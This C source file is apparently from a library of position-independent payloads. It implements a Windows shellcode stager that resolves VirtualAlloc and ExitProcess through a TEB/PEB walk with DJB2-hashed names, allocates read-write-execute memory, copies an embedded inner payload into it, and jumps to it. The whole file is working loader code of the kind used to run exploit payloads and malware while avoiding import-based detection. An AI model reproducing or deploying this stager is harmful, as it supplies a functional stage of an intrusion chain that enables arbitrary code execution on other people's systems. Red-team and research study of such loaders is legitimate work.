/*
 * alloc_jump payload for Windows — allocate RWX, copy inner payload, jump.
 *
 * Resolves VirtualAlloc from kernel32.dll via TEB/PEB walk with DJB2
 * hash-based function resolution. Reads payload size and data from
 * the config struct, allocates executable memory, copies the payload,
 * and transfers execution.
 *
 * Config layout:
 *   +0x00: payload_size (u32, little-endian)
 *   +0x04: payload_data (payload_size bytes)
 */

#include "picblobs/os/windows.h"
#include "picblobs/reloc.h"
#include "picblobs/section.h"
#include "picblobs/types.h"
#include "picblobs/win/resolve.h"

/* DJB2 hashes — precomputed. */
#define HASH_KERNEL32_DLL 0x7040EE75   /* djb2("kernel32.dll") lowercase */
#define HASH_VIRTUAL_ALLOC 0x382C0F97  /* djb2("VirtualAlloc") */
#define HASH_EXIT_PROCESS 0xB769339E   /* djb2("ExitProcess") */

/* Windows constants. */
#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40

/* Windows API function pointer types. */
typedef void *(PIC_WINAPI *fn_VirtualAlloc)(void *lpAddress, pic_uintptr dwSize,
	unsigned long flAllocationType, unsigned long flProtect);
typedef void (PIC_WINAPI *fn_ExitProcess)(unsigned int uExitCode);

/* Config struct (fixed header only). */
struct alloc_jump_config {
	pic_u32 payload_size;
	/* followed by payload_data[payload_size] */
};

/*
 * ASM config anchor — prevents the compiler from seeing the initial
 * zeros and optimizing away our runtime reads.
 */
__asm__(".section .config,\"aw\"\n"
	".globl alloc_jump_config\n"
	"alloc_jump_config:\n"
	".space 4\n"
	".previous\n");

PIC_ENTRY
void _start(void)
{
	PIC_SELF_RELOCATE();

	/* Resolve kernel32.dll functions via TEB -> PEB -> export table. */
	fn_VirtualAlloc pVirtualAlloc = (fn_VirtualAlloc)pic_resolve(
		HASH_KERNEL32_DLL, HASH_VIRTUAL_ALLOC);
	fn_ExitProcess pExitProcess = (fn_ExitProcess)pic_resolve(
		HASH_KERNEL32_DLL, HASH_EXIT_PROCESS);

	if (!pVirtualAlloc || !pExitProcess)
		for (;;)
			;

	extern char alloc_jump_config[] __attribute__((visibility("hidden")));
	const struct alloc_jump_config *cfg =
		(const struct alloc_jump_config *)(void *)alloc_jump_config;

	pic_u32 size = cfg->payload_size;
	if (size == 0) {
		pExitProcess(1);
		for (;;)
			;
	}

	/* Allocate RWX memory for the inner payload. */
	void *mem = pVirtualAlloc(PIC_NULL, (pic_uintptr)size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!mem) {
		pExitProcess(1);
		for (;;)
			;
	}

	/* Copy payload into allocated memory. */
	pic_u8 *dst = (pic_u8 *)mem;
	const pic_u8 *src =
		(const pic_u8 *)alloc_jump_config + sizeof(struct alloc_jump_config);
	for (pic_u32 i = 0; i < size; i++)
		dst[i] = src[i];

	/* Jump to the inner payload. */
	((void (*)(void))mem)();

	/* Should not return. */
	pExitProcess(0);
}
